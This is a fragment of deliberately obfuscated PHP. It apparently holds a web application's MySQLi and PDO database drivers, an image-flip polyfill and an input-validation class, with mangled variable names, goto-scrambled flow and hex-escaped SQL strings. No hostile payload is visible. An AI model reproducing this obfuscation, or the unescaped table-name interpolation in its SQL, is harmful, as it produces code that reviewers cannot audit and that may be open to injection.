$this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aµ“„ßÙá = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aµ“„ßÙá) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e³™ùÏ‹İ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$e³™ùÏ‹İ) { $this->error(); return !1; } } return !0; } private function getAll() { $B“ëš‡§À’ = array(); if ($this->numRows > 0) { for ($CÑÂØÜ‰Õç = 0; $CÑÂØÜ‰Õç < $this->numRows; $CÑÂØÜ‰Õç++) { $B“ëš‡§À’[$CÑÂØÜ‰Õç] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $B“ëš‡§À’; } public function getFields($fĞÁÉèÓ¾) { $BĞ®Ëæ·‘× =& $_SERVER[í…¶]; $ašŒ–—•Ö· = $this->query($BĞ®Ëæ·‘×[808] . $this->parseKey($fĞÁÉèÓ¾)); $CÆ†¹‡œ– = array(); if ($ašŒ–—•Ö·) { foreach ($ašŒ–—•Ö· as $eá åƒïï” => $b±Æ“Ù‘ö) { $CÆ†¹‡œ–[$b±Æ“Ù‘ö[$BĞ®Ëæ·‘×[27]]] = array($BĞ®Ëæ·‘×[28] => $b±Æ“Ù‘ö[$BĞ®Ëæ·‘×[27]], $BĞ®Ëæ·‘×[29] => $b±Æ“Ù‘ö[$BĞ®Ëæ·‘×[30]], $BĞ®Ëæ·‘×[31] => (bool) ($b±Æ“Ù‘ö[$BĞ®Ëæ·‘×[32]] === $BĞ®Ëæ·‘×[33]), $BĞ®Ëæ·‘×[34] => $b±Æ“Ù‘ö[$BĞ®Ëæ·‘×[35]], $BĞ®Ëæ·‘×[36] => strtolower($b±Æ“Ù‘ö[$BĞ®Ëæ·‘×[37]]) == $BĞ®Ëæ·‘×[38], $BĞ®Ëæ·‘×[39] => strtolower($b±Æ“Ù‘ö[$BĞ®Ëæ·‘×[40]]) == $BĞ®Ëæ·‘×[41]); } } return $CÆ†¹‡œ–; } public function getTables($CÒˆ«îŸ´ã = '') { $eä¤Ñ¢‰ =& $_SERVER[í…¶]; $c˜Êœº˜ÔŸ = !empty($CÒˆ«îŸ´ã) ? $eä¤Ñ¢‰[810] . $CÒˆ«îŸ´ã : $eä¤Ñ¢‰[811]; $b£ôİÓŠØ† = $this->query($c˜Êœº˜ÔŸ); $f¼¸ˆÀ‘Õ = array(); if ($b£ôİÓŠØ†) { foreach ($b£ôİÓŠØ† as $EÜ‡õŠ¨Ñ => $A×åäŸä‡) { $f¼¸ˆÀ‘Õ[$EÜ‡õŠ¨Ñ] = current($A×åäŸä‡); } } return $f¼¸ˆÀ‘Õ; } public function replace($F‡îãíÇÏä, $BÑ³¸¸ù‘ = array()) { $Fî‚ˆçò… =& $_SERVER[í…¶]; foreach ($F‡îãíÇÏä as $E„©ç‰äë¸ => $cÕÒÂ“çÄ) { $D™ Ïµ—©¹ = $this->parseValue($cÕÒÂ“çÄ); if (is_scalar($D™ Ïµ—©¹)) { $bÉ›¾”òÄƒ[] = $D™ Ïµ—©¹; $E±Æô£Ï¥[] = $this->parseKey($E„©ç‰äë¸); } } $d»¯¿ÕéŒ = $Fî‚ˆçò…[812] . $this->parseTable($BÑ³¸¸ù‘[$Fî‚ˆçò…[267]]) . $Fî‚ˆçò…[813] . implode($Fî‚ˆçò…[47], $E±Æô£Ï¥) . $Fî‚ˆçò…[814] . implode($Fî‚ˆçò…[47], $bÉ›¾”òÄƒ) . $Fî‚ˆçò…[815]; return $this->execute($d»¯¿ÕéŒ); } public function insertAll($a¯ñ¡â±ÇË, $f×²²†¦» = array(), $Dëœå‡ÆŞØ = false) { goto E¯è‚Œ°ƒš; E¯è‚Œ°ƒš: $E—ÛÏù¥õİ =& $_SERVER[í…¶]; if (!is_array($a¯ñ¡â±ÇË[0])) { return !1; } $F¥“ãÚ—íğ = array_keys($a¯ñ¡â±ÇË[0]); goto EèôôÈÅÏÅ; f¥¬¨êâÊä: $cùÜ—‡õ¹Ò = ($Dëœå‡ÆŞØ ? $E—ÛÏù¥õİ[817] : $E—ÛÏù¥õİ[818]) . $E—ÛÏù¥õİ[819] . $this->parseTable($f×²²†¦»[$E—ÛÏù¥õİ[267]]) . $E—ÛÏù¥õİ[813] . implode($E—ÛÏù¥õİ[47], $F¥“ãÚ—íğ) . $E—ÛÏù¥õİ[820] . implode($E—ÛÏù¥õİ[47], $a¥‘ˆåËÆ); return $this->execute($cùÜ—‡õ¹Ò); goto b„òÆ“÷®; EèôôÈÅÏÅ: $a¥‘ˆåËÆ = array(); foreach ($a¯ñ¡â±ÇË as $bãÆŒ“œç) { $AùÑÜ„ï‰ª = array(); foreach ($bãÆŒ“œç as $fŞğë—ß => $fÅø…œƒ—Š) { $fÅø…œƒ—Š = $this->parseValue($fÅø…œƒ—Š); if (is_scalar($fÅø…œƒ—Š)) { $AùÑÜ„ï‰ª[] = $fÅø…œƒ—Š; } } $a¥‘ˆåËÆ[] = $E—ÛÏù¥õİ[248] . implode($E—ÛÏù¥õİ[47], $AùÑÜ„ï‰ª) . $E—ÛÏù¥õİ[815]; } array_walk($F¥“ãÚ—íğ, array($this, $E—ÛÏù¥õİ[816])); goto f¥¬¨êâÊä; b„òÆ“÷®: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eÜÛá‘î =& $_SERVER[í…¶]; $this->error = $this->_linkID->errno . $eÜÛá‘î[4] . $this->_linkID->error; if ($eÜÛá‘î[33] != $this->queryStr) { $this->error .= LNG($eÜÛá‘î[45]) . $this->queryStr; } think_trace($this->error, $eÜÛá‘î[33], $eÜÛá‘î[46]); return $this->error; } public function escapeString($c»Â¬ªÑÚå) { if ($this->_linkID) { return $this->_linkID->real_escape_string($c»Â¬ªÑÚå); } else { return addslashes($c»Â¬ªÑÚå); } } public function parseKey(&$E‚×ºØóº–, $eñğÖÕí²¨ = true) { $cÖÈÑäÇ =& $_SERVER[í…¶]; if ($eñğÖÕí²¨) { $E‚×ºØóº– = $this->parseKeyCheck($E‚×ºØóº–); } if ($E‚×ºØóº– != $cÖÈÑäÇ[176] && !preg_match($cÖÈÑäÇ[821], $E‚×ºØóº–)) { $E‚×ºØóº– = $cÖÈÑäÇ[822] . trim($E‚×ºØóº–, $cÖÈÑäÇ[822]) . $cÖÈÑäÇ[822]; } return $E‚×ºØóº–; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($A©´ÙšÕÒ = '') { $cëÓñ–Ìî =& $_SERVER[í…¶]; if (!class_exists($cëÓñ–Ìî[824])) { think_exception(think_lang($cëÓñ–Ìî[10]) . $cëÓñ–Ìî[825]); } if (!empty($A©´ÙšÕÒ)) { $this->config = $A©´ÙšÕÒ; if (empty($this->config[$cëÓñ–Ìî[13]])) { $this->config[$cëÓñ–Ìî[13]] = array(); } } } public function connect($Fäì×“¥ßğ = '', $E“ó……È…† = 0) { $F‹Ÿ½Äõ©æ =& $_SERVER[í…¶]; if (!isset($this->linkID[$E“ó……È…†])) { goto e¬šó·ÙØ„; D¢Ç»‹Íã«: $this->linkID[$E“ó……È…†]->exec($F‹Ÿ½Äõ©æ[835] . think_config($F‹Ÿ½Äõ©æ[802])); $this->connected = !0; if (1 != think_config($F‹Ÿ½Äõ©æ[18])) { unset($this->config); } goto cáÌ”ßÁä¿; dÆ˜ ‰‚‹: $this->dbType = $this->_getDsnType($Fäì×“¥ßğ[$F‹Ÿ½Äõ©æ[826]]); if (in_array($this->dbType, array($F‹Ÿ½Äõ©æ[827], $F‹Ÿ½Äõ©æ[828], $F‹Ÿ½Äõ©æ[829], $F‹Ÿ½Äõ©æ[830]))) { think_exception($F‹Ÿ½Äõ©æ[831] . $this->dbType . $F‹Ÿ½Äõ©æ[832] . $this->dbType . $F‹Ÿ½Äõ©æ[833]); } if (!$this->linkID[$E“ó……È…†]) { think_exception($F‹Ÿ½Äõ©æ[834]); } goto D¢Ç»‹Íã«; e¬šó·ÙØ„: if (empty($Fäì×“¥ßğ)) { $Fäì×“¥ßğ = $this->config; } if ($this->pconnect) { $Fäì×“¥ßğ[$F‹Ÿ½Äõ©æ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$E“ó……È…†] = new PDO($Fäì×“¥ßğ[$F‹Ÿ½Äõ©æ[826]], $Fäì×“¥ßğ[$F‹Ÿ½Äõ©æ[799]], $Fäì×“¥ßğ[$F‹Ÿ½Äõ©æ[800]], $Fäì×“¥ßğ[$F‹Ÿ½Äõ©æ[13]]); } catch (PDOException $b·Úåéğ•§) { think_exception($b·Úåéğ•§->getMessage()); } goto dÆ˜ ‰‚‹; cáÌ”ßÁä¿: } return $this->linkID[$E“ó……È…†]; } public function free() { $this->PDOStatement = null; } public function query($Fº„¯óòò«, $EŠˆ·™Ùà = array()) { goto B´”†±³¶ä; A“ÊŒğèç½: think_action_status($C¶Ø¾ŠÑ‘‰[19], 1); think_status($C¶Ø¾ŠÑ‘‰[20]); $this->PDOStatement = $this->_linkID->prepare($Fº„¯óòò«); goto fåèßÏ§µª; fåèßÏ§µª: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $fÇÌîÍİÆÁ = $this->PDOStatement->execute($EŠˆ·™Ùà); $this->debug(); goto BÜšáÍÒõ¨; e‡ğŒ…ìô¢: $this->queryStr = $Fº„¯óòò«; if (!empty($EŠˆ·™Ùà)) { $this->queryStr .= $C¶Ø¾ŠÑ‘‰[836] . print_r($EŠˆ·™Ùà, !0) . $C¶Ø¾ŠÑ‘‰[837]; } if (!empty($this->PDOStatement)) { $this->free(); } goto A“ÊŒğèç½; B´”†±³¶ä: $C¶Ø¾ŠÑ‘‰ =& $_SERVER[í…¶]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e‡ğŒ…ìô¢; BÜšáÍÒõ¨: if (!1 === $fÇÌîÍİÆÁ) { $this->error(); return !1; } else { return $this->getAll(); } goto b‚²Š¾²âô; b‚²Š¾²âô: } public function execute($d£‘ÃåÕÄİ, $EŞ›¤Ì = array()) { goto B¶õÇ¢£Ä ; C…ÜÓº‰¡»: if ($this->dbType == $Cã¸Î¤¢Õ…[830]) { if (preg_match($Cã¸Î¤¢Õ…[838], $this->queryStr, $b”ºÍĞ’)) { $this->table = think_config($Cã¸Î¤¢Õ…[839]) . str_ireplace(think_config($Cã¸Î¤¢Õ…[840]), $Cã¸Î¤¢Õ…[370], $b”ºÍĞ’[2]); $E¿‘à¥Â¢¼ = (bool) $this->query($Cã¸Î¤¢Õ…[841] . strtoupper($this->table) . $Cã¸Î¤¢Õ…[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Cã¸Î¤¢Õ…[21], 1); goto Dö•Åˆˆî; B¶õÇ¢£Ä : $Cã¸Î¤¢Õ… =& $_SERVER[í…¶]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FÄ×­â÷Ó¡; FÄ×­â÷Ó¡: $this->queryStr = $d£‘ÃåÕÄİ; if (!empty($EŞ›¤Ì)) { $this->queryStr .= $Cã¸Î¤¢Õ…[836] . print_r($EŞ›¤Ì, !0) . $Cã¸Î¤¢Õ…[837]; } $E¿‘à¥Â¢¼ = !1; goto C…ÜÓº‰¡»; bˆ½ÂáÁ¼‘: $d²‘™Ê¿õ = $this->PDOStatement->execute($EŞ›¤Ì); $this->debug(); if (!1 === $d²‘™Ê¿õ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($E¿‘à¥Â¢¼ || preg_match($Cã¸Î¤¢Õ…[842], $d£‘ÃåÕÄİ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto eŒÍà†İ‡Â; Dö•Åˆˆî: think_status($Cã¸Î¤¢Õ…[20]); $this->PDOStatement = $this->_linkID->prepare($d£‘ÃåÕÄİ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto bˆ½ÂáÁ¼‘; eŒÍà†İ‡Â: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C‹†Š‡ÙÇ = $this->_linkID->commit(); $this->transTimes = 0; if (!$C‹†Š‡ÙÇ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÍ“·ìÁô = $this->_linkID->rollback(); $this->transTimes = 0; if (!$aÍ“·ìÁô) { $this->error(); return !1; } } return !0; } private function getAll() { $c…îë²°¾ñ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($c…îë²°¾ñ); return $c…îë²°¾ñ; } public function getFields($dî°Ò¨™Ÿ¦) { goto EÁÇƒ±Ğ¶ñ; cëéŞÊ­©¯: return $fŸ“‰ÌàŞš; goto FÇ¥¡Õ¦ˆ³; c¸›†¼¦´: $f„İùòò—¾ = $this->query($f¶ƒá™œ§×); $fŸ“‰ÌàŞš = array(); if ($f„İùòò—¾) { foreach ($f„İùòò—¾ as $D¯Ú½†¡Ú => $aœÙÉÃ˜‰) { $aœÙÉÃ˜‰ = array_change_key_case($aœÙÉÃ˜‰); $aœÙÉÃ˜‰[$AëèÍÙî£À[28]] = isset($aœÙÉÃ˜‰[$AëèÍÙî£À[28]]) ? $aœÙÉÃ˜‰[$AëèÍÙî£À[28]] : $AëèÍÙî£À[370]; $aœÙÉÃ˜‰[$AëèÍÙî£À[29]] = isset($aœÙÉÃ˜‰[$AëèÍÙî£À[29]]) ? $aœÙÉÃ˜‰[$AëèÍÙî£À[29]] : $AëèÍÙî£À[370]; $Aöù½‚‘ùÅ = isset($aœÙÉÃ˜‰[$AëèÍÙî£À[261]]) ? $aœÙÉÃ˜‰[$AëèÍÙî£À[261]] : $aœÙÉÃ˜‰[$AëèÍÙî£À[28]]; $fŸ“‰ÌàŞš[$Aöù½‚‘ùÅ] = array($AëèÍÙî£À[28] => $Aöù½‚‘ùÅ, $AëèÍÙî£À[29] => $aœÙÉÃ˜‰[$AëèÍÙî£À[29]], $AëèÍÙî£À[31] => (bool) (isset($aœÙÉÃ˜‰[$AëèÍÙî£À[99]]) && $aœÙÉÃ˜‰[$AëèÍÙî£À[99]] === $AëèÍÙî£À[33] || isset($aœÙÉÃ˜‰[$AëèÍÙî£À[31]]) && $aœÙÉÃ˜‰[$AëèÍÙî£À[31]] === $AëèÍÙî£À[33]), $AëèÍÙî£À[34] => isset($aœÙÉÃ˜‰[$AëèÍÙî£À[34]]) ? $aœÙÉÃ˜‰[$AëèÍÙî£À[34]] : (isset($aœÙÉÃ˜‰[$AëèÍÙî£À[53]]) ? $aœÙÉÃ˜‰[$AëèÍÙî£À[53]] : $AëèÍÙî£À[370]), $AëèÍÙî£À[36] => isset($aœÙÉÃ˜‰[$AëèÍÙî£À[89]]) ? strtolower($aœÙÉÃ˜‰[$AëèÍÙî£À[89]]) == $AëèÍÙî£À[38] : (isset($aœÙÉÃ˜‰[$AëèÍÙî£À[54]]) ? $aœÙÉÃ˜‰[$AëèÍÙî£À[54]] : !1), $AëèÍÙî£À[39] => isset($aœÙÉÃ˜‰[$AëèÍÙî£À[859]]) ? strtolower($aœÙÉÃ˜‰[$AëèÍÙî£À[859]]) == $AëèÍÙî£À[41] : (isset($aœÙÉÃ˜‰[$AëèÍÙî£À[89]]) ? $aœÙÉÃ˜‰[$AëèÍÙî£À[89]] : !1)); } } goto cëéŞÊ­©¯; EÁÇƒ±Ğ¶ñ: $AëèÍÙî£À =& $_SERVER[í…¶]; $this->initConnect(!0); if (think_config($AëèÍÙî£À[843])) { $f¶ƒá™œ§× = str_replace($AëèÍÙî£À[844], $dî°Ò¨™Ÿ¦, think_config($AëèÍÙî£À[843])); } else { switch ($this->dbType) { case $AëèÍÙî£À[827]: case $AëèÍÙî£À[845]: $f¶ƒá™œ§× = "\123\x45\x4c\105\103\x54\x20\40\x20\x63\x6f\154\x75\x6d\x6e\x5f\x6e\141\x6d\x65\40\141\163\40\47\x4e\141\x6d\145\x27\54\x20\x20\x20\x64\x61\x74\141\137\x74\171\x70\145\40\x61\163\x20\47\x54\171\160\x65\x27\x2c\40\40\40\x63\157\154\x75\x6d\156\137\x64\x65\x66\x61\165\154\164\x20\x61\163\40\x27\x44\x65\x66\x61\x75\154\x74\x27\x2c\40\x20\40\151\163\137\x6e\165\154\x6c\141\142\154\145\40\x61\163\x20\x27\116\165\154\x6c\x27\12\x9\11\106\x52\x4f\115\11\x69\x6e\x66\x6f\162\155\x61\164\x69\157\x6e\x5f\163\x63\150\x65\155\141\x2e\x74\141\x62\154\x65\x73\40\101\123\40\164\xa\x9\11\x4a\x4f\x49\116\x9\151\156\146\x6f\x72\155\141\x74\151\157\x6e\x5f\163\x63\x68\145\155\141\x2e\x63\157\154\x75\155\156\163\40\x41\123\40\143\12\x9\11\x4f\116\x20\40\x74\x2e\164\x61\x62\x6c\x65\137\143\141\x74\x61\x6c\x6f\x67\40\75\40\x63\56\164\141\x62\154\145\x5f\143\141\164\141\154\x6f\x67\12\11\11\x41\x4e\104\x20\x74\x2e\164\x61\142\x6c\x65\137\163\x63\150\145\x6d\x61\x20\x3d\x20\x63\x2e\x74\141\142\x6c\145\x5f\x73\x63\x68\145\155\x61\12\11\x9\101\x4e\x44\40\164\x2e\164\141\142\154\145\137\x6e\x61\155\145\40\x3d\x20\143\x2e\x74\141\x62\x6c\145\x5f\x6e\x61\155\x65\xa\x9\11\x57\x48\x45\x52\105\40\x20\40\x74\x2e\x74\141\142\154\145\x5f\x6e\141\x6d\145\x20\x3d\x20\x27{$dî°Ò¨™Ÿ¦}\x27"; break; case $AëèÍÙî£À[846]: $f¶ƒá™œ§× = $AëèÍÙî£À[847] . $dî°Ò¨™Ÿ¦ . $AëèÍÙî£À[848]; break; case $AëèÍÙî£À[828]: case $AëèÍÙî£À[830]: $f¶ƒá™œ§× = $AëèÍÙî£À[849] . $AëèÍÙî£À[850] . $AëèÍÙî£À[851] . strtoupper($dî°Ò¨™Ÿ¦) . $AëèÍÙî£À[852] . strtoupper($dî°Ò¨™Ÿ¦) . $AëèÍÙî£À[853]; break; case $AëèÍÙî£À[854]: $f¶ƒá™œ§× = $AëèÍÙî£À[855] . $dî°Ò¨™Ÿ¦ . $AëèÍÙî£À[856]; break; case $AëèÍÙî£À[829]: break; case $AëèÍÙî£À[857]: default: $f¶ƒá™œ§× = $AëèÍÙî£À[858] . ($this->dbType == $AëèÍÙî£À[857] ? "\140{$dî°Ò¨™Ÿ¦}\140" : $dî°Ò¨™Ÿ¦); } } goto c¸›†¼¦´; FÇ¥¡Õ¦ˆ³: } public function getTables($cêÚÂœ·ì = '') { $f×ÔöÕ…’š =& $_SERVER[í…¶]; if (think_config($f×ÔöÕ…’š[860])) { $eÇ·ßÒ§¦ = str_replace($f×ÔöÕ…’š[861], $cêÚÂœ·ì, think_config($f×ÔöÕ…’š[860])); } else { switch ($this->dbType) { case $f×ÔöÕ…’š[828]: case $f×ÔöÕ…’š[830]: $eÇ·ßÒ§¦ = $f×ÔöÕ…’š[862]; break; case $f×ÔöÕ…’š[827]: case $f×ÔöÕ…’š[845]: $eÇ·ßÒ§¦ = $f×ÔöÕ…’š[863]; break; case $f×ÔöÕ…’š[854]: $eÇ·ßÒ§¦ = $f×ÔöÕ…’š[864]; break; case $f×ÔöÕ…’š[829]: think_exception(think_lang($f×ÔöÕ…’š[865]) . $f×ÔöÕ…’š[866]); break; case $f×ÔöÕ…’š[846]: $eÇ·ßÒ§¦ = $f×ÔöÕ…’š[42] . $f×ÔöÕ…’š[43] . $f×ÔöÕ…’š[44]; break; case $f×ÔöÕ…’š[857]: default: if (!empty($cêÚÂœ·ì)) { $eÇ·ßÒ§¦ = $f×ÔöÕ…’š[810] . $cêÚÂœ·ì; } else { $eÇ·ßÒ§¦ = $f×ÔöÕ…’š[811]; } } } $d¿Øã÷š = $this->query($eÇ·ßÒ§¦); $C ­‰š§ “ = array(); foreach ($d¿Øã÷š as $D¶…Ôé¨» => $B••¡ŒÚËÔ) { $C ­‰š§ “[$D¶…Ôé¨»] = current($B••¡ŒÚËÔ); } return $C ­‰š§ “; } protected function parseLimit($f°‚·ŸÍ„) { $C¯®°äÊ± =& $_SERVER[í…¶]; $FÀ áˆÃö¥ = $C¯®°äÊ±[33]; if (!empty($f°‚·ŸÍ„)) { switch ($this->dbType) { case $C¯®°äÊ±[854]: case $C¯®°äÊ±[846]: $f°‚·ŸÍ„ = explode($C¯®°äÊ±[47], $f°‚·ŸÍ„); if (count($f°‚·ŸÍ„) > 1) { $FÀ áˆÃö¥ .= $C¯®°äÊ±[48] . $f°‚·ŸÍ„[1] . $C¯®°äÊ±[49] . $f°‚·ŸÍ„[0] . $C¯®°äÊ±[50]; } else { $FÀ áˆÃö¥ .= $C¯®°äÊ±[48] . $f°‚·ŸÍ„[0] . $C¯®°äÊ±[50]; } break; case $C¯®°äÊ±[827]: case $C¯®°äÊ±[845]: break; case $C¯®°äÊ±[829]: break; case $C¯®°äÊ±[828]: case $C¯®°äÊ±[830]: break; case $C¯®°äÊ±[857]: default: $FÀ áˆÃö¥ .= $C¯®°äÊ±[48] . $f°‚·ŸÍ„ . $C¯®°äÊ±[50]; } } return $FÀ áˆÃö¥; } public function parseKey(&$c·‘¯ñ”¨±, $CÀ­©·ÂÒï = true) { $bË¶¸‹È‹Ô =& $_SERVER[í…¶]; if ($CÀ­©·ÂÒï) { $c·‘¯ñ”¨± = $this->parseKeyCheck($c·‘¯ñ”¨±); } if ($this->dbType == $bË¶¸‹È‹Ô[857]) { if ($c·‘¯ñ”¨± != $bË¶¸‹È‹Ô[176] && !preg_match($bË¶¸‹È‹Ô[821], $c·‘¯ñ”¨±)) { $c·‘¯ñ”¨± = $bË¶¸‹È‹Ô[822] . trim($c·‘¯ñ”¨±, $bË¶¸‹È‹Ô[822]) . $bË¶¸‹È‹Ô[822]; } return $c·‘¯ñ”¨±; } else { return parent::parseKey($c·‘¯ñ”¨±); } } public function close() { $this->_linkID = null; } public function error() { $eõ¿‰á¡Ä¯ =& $_SERVER[í…¶]; if ($this->PDOStatement) { $dÌ¤ğ¾–¤Û = $this->PDOStatement->errorInfo(); $this->error = $dÌ¤ğ¾–¤Û[1] . $eõ¿‰á¡Ä¯[4] . $dÌ¤ğ¾–¤Û[2]; } else { $this->error = $eõ¿‰á¡Ä¯[33]; } if ($eõ¿‰á¡Ä¯[33] != $this->queryStr) { $this->error .= LNG($eõ¿‰á¡Ä¯[45]) . $this->queryStr; } think_trace($this->error, $eõ¿‰á¡Ä¯[33], $eõ¿‰á¡Ä¯[46]); return $this->error; } public function escapeString($cè½“´±´Ô) { $AÓÙâè„ÜË =& $_SERVER[í…¶]; switch ($this->dbType) { case $AÓÙâè„ÜË[854]: case $AÓÙâè„ÜË[827]: case $AÓÙâè„ÜË[845]: case $AÓÙâè„ÜË[857]: return addslashes($cè½“´±´Ô); case $AÓÙâè„ÜË[829]: case $AÓÙâè„ÜË[846]: case $AÓÙâè„ÜË[828]: case $AÓÙâè„ÜË[830]: return str_ireplace($AÓÙâè„ÜË[55], $AÓÙâè„ÜË[56], $cè½“´±´Ô); } } protected function parseValue($FåÜ¶ò»à) { $e¿©ïö´Ë¨ =& $_SERVER[í…¶]; if (is_string($FåÜ¶ò»à)) { $FåÜ¶ò»à = strpos($FåÜ¶ò»à, $e¿©ïö´Ë¨[4]) === 0 ? $this->escapeString($FåÜ¶ò»à) : $e¿©ïö´Ë¨[867] . $this->escapeString($FåÜ¶ò»à) . $e¿©ïö´Ë¨[867]; } elseif (isset($FåÜ¶ò»à[0]) && is_string($FåÜ¶ò»à[0]) && strtolower($FåÜ¶ò»à[0]) == $e¿©ïö´Ë¨[285]) { $FåÜ¶ò»à = $this->escapeString($FåÜ¶ò»à[1]); } elseif (is_array($FåÜ¶ò»à)) { $FåÜ¶ò»à = array_map(array($this, $e¿©ïö´Ë¨[868]), $FåÜ¶ò»à); } elseif (is_bool($FåÜ¶ò»à)) { $FåÜ¶ò»à = $FåÜ¶ò»à ? $e¿©ïö´Ë¨[83] : $e¿©ïö´Ë¨[477]; } elseif (is_null($FåÜ¶ò»à)) { $FåÜ¶ò»à = $e¿©ïö´Ë¨[99]; } return $FåÜ¶ò»à; } public function getLastInsertId() { $dï·Áôö° =& $_SERVER[í…¶]; switch ($this->dbType) { case $dï·Áôö°[854]: case $dï·Áôö°[846]: case $dï·Áôö°[827]: case $dï·Áôö°[845]: case $dï·Áôö°[829]: case $dï·Áôö°[857]: return $this->_linkID->lastInsertId(); case $dï·Áôö°[828]: case $dï·Áôö°[830]: $bÒãœåŒ–Î = $this->table; $aô™à‚½Ö = $this->query("\123\105\x4c\105\x43\124\x20{$bÒãœåŒ–Î}\56\x63\165\x72\x72\x76\x61\154\40\143\165\x72\162\x76\x61\154\40\x46\x52\x4f\115\40\x64\x75\x61\x6c"); return $aô™à‚½Ö ? $aô™à‚½Ö[0][$dï·Áôö°[869]] : 0; } } } goto A´·ÑõÔŞ; b æßõÃ‹©: if (!function_exists($_SERVER[í…¶][1868])) { define($_SERVER[í…¶][1869], 0); define($_SERVER[í…¶][1870], 1); define($_SERVER[í…¶][1871], 2); function imageflip($E÷à”÷ùãƒ, $d‚…‡¯Ãé) { switch ($d‚…‡¯Ãé) { case IMG_FLIP_HORIZONTAL: $eÂ‹Ô¥³ = imagesx($E÷à”÷ùãƒ) - 1; $BØ¯¶ª´°À = $eÂ‹Ô¥³ / 2; $bÏ‘Òçèª½ = imagesy($E÷à”÷ùãƒ); $DÆ èâŒ‡¼ = imageistruecolor($E÷à”÷ùãƒ) ? imagecreatetruecolor(1, $bÏ‘Òçèª½) : imagecreate(1, $bÏ‘Òçèª½); for ($E¿ê­÷Ş×¤ = 0; $E¿ê­÷Ş×¤ < $BØ¯¶ª´°À; ++$E¿ê­÷Ş×¤) { imagecopy($DÆ èâŒ‡¼, $E÷à”÷ùãƒ, 0, 0, $E¿ê­÷Ş×¤, 0, 1, $bÏ‘Òçèª½); imagecopy($E÷à”÷ùãƒ, $E÷à”÷ùãƒ, $E¿ê­÷Ş×¤, 0, $eÂ‹Ô¥³ - $E¿ê­÷Ş×¤, 0, 1, $bÏ‘Òçèª½); imagecopy($E÷à”÷ùãƒ, $DÆ èâŒ‡¼, $eÂ‹Ô¥³ - $E¿ê­÷Ş×¤, 0, 0, 0, 1, $bÏ‘Òçèª½); } break; case IMG_FLIP_VERTICAL: $fÈ–ƒíÊÒ = imagesx($E÷à”÷ùãƒ); $B¾æÖÇå™÷ = imagesy($E÷à”÷ùãƒ) - 1; $bìäš£¬¼ß = $B¾æÖÇå™÷ / 2; $DÆ èâŒ‡¼ = imageistruecolor($E÷à”÷ùãƒ) ? imagecreatetruecolor($fÈ–ƒíÊÒ, 1) : imagecreate($fÈ–ƒíÊÒ, 1); for ($F£ƒµÑ¢»¿ = 0; $F£ƒµÑ¢»¿ < $bìäš£¬¼ß; ++$F£ƒµÑ¢»¿) { imagecopy($DÆ èâŒ‡¼, $E÷à”÷ùãƒ, 0, 0, 0, $F£ƒµÑ¢»¿, $fÈ–ƒíÊÒ, 1); imagecopy($E÷à”÷ùãƒ, $E÷à”÷ùãƒ, 0, $F£ƒµÑ¢»¿, 0, $B¾æÖÇå™÷ - $F£ƒµÑ¢»¿, $fÈ–ƒíÊÒ, 1); imagecopy($E÷à”÷ùãƒ, $DÆ èâŒ‡¼, 0, $B¾æÖÇå™÷ - $F£ƒµÑ¢»¿, 0, 0, $fÈ–ƒíÊÒ, 1); } break; case IMG_FLIP_BOTH: $fÈ–ƒíÊÒ = imagesx($E÷à”÷ùãƒ); $bÏ‘Òçèª½ = imagesy($E÷à”÷ùãƒ); $DÆ èâŒ‡¼ = imagerotate($E÷à”÷ùãƒ, 180, 0); imagecopy($E÷à”÷ùãƒ, $DÆ èâŒ‡¼, 0, 0, 0, 0, $fÈ–ƒíÊÒ, $bÏ‘Òçèª½); break; default: return; } imagedestroy($DÆ èâŒ‡¼); } } if (!function_exists($_SERVER[í…¶][1872])) { function imagecreatefrombmp($eÎà®çÜ) { return ImageGdBMP::load($eÎà®çÜ); } } class Input { public static function getArray($BÏ„²ÓéÜŠ) { goto aí±Œ’ê©À; B³ÖùÆ†ÉÆ: if (count($F­ÙÍ¦‚Î) > 0) { show_json(implode($Aæ‹½¶[1877], $F­ÙÍ¦‚Î), !1); } return $CŸ˜‘ÍÇ­¥; goto Cœë«¶Ù§¥; c°„İŒ½ó‘: $F­ÙÍ¦‚Î = array(); $e—Ë¿†îî = LNG($Aæ‹½¶[1873]); foreach ($BÏ„²ÓéÜŠ as $DÛ°­æ‡â„ => $Añ²…‚£ô£) { goto AŠÔ¯ÅŒÁª; DîŞ¼Šøœ: if (isset($Añ²…‚£ô£[$Aæ‹½¶[1876]]) && !self::check($in[$DÛ°­æ‡â„], $Añ²…‚£ô£[$Aæ‹½¶[1876]], $cˆ“º¿î¤†)) { if (array_key_exists($Aæ‹½¶[1875], $Añ²…‚£ô£)) { if (!is_null($Añ²…‚£ô£[$Aæ‹½¶[1875]])) { $CŸ˜‘ÍÇ­¥[$Eö¨¡ù‘¤] = $Añ²…‚£ô£[$Aæ‹½¶[1875]]; } } else { $F­ÙÍ¦‚Î[] = $cšç¢ ¼¼î; } continue; } $CŸ˜‘ÍÇ­¥[$Eö¨¡ù‘¤] = $in[$DÛ°­æ‡â„]; goto e‚‡ÊÈ×Á; AŠÔ¯ÅŒÁª: $cšç¢ ¼¼î = _get($Añ²…‚£ô£, $Aæ‹½¶[1244], $e—Ë¿†îî . $Aæ‹½¶[878] . $DÛ°­æ‡â„); $Eö¨¡ù‘¤ = 